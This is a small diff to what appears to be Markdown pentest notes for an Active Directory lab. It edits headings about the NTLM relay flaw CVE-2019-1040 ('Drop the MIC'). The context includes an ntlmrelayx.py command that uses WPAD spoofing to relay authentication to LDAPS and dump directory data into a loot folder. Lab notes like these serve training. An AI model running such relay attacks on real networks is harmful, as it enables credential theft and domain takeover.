@@ -97,9 +97,7 @@ If we specify a loot dir all the informations on the ldap are automatically dump
 ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
 ```
 
-## Drop the mic
-
-#### **CVE-2019-1040 – "Drop The MIC" (a.k.a. "Remove MIC")**
+## **CVE-2019-1040 – "Drop The MIC" (a.k.a. "Remove MIC")**
 
 > Une vulnérabilité dans NTLM qui permet de relayer une authentification SMB vers LDAPS **en supprimant le MIC (Message Integrity Code)**, ce qui normalement est censé empêcher ce type de relai.
 
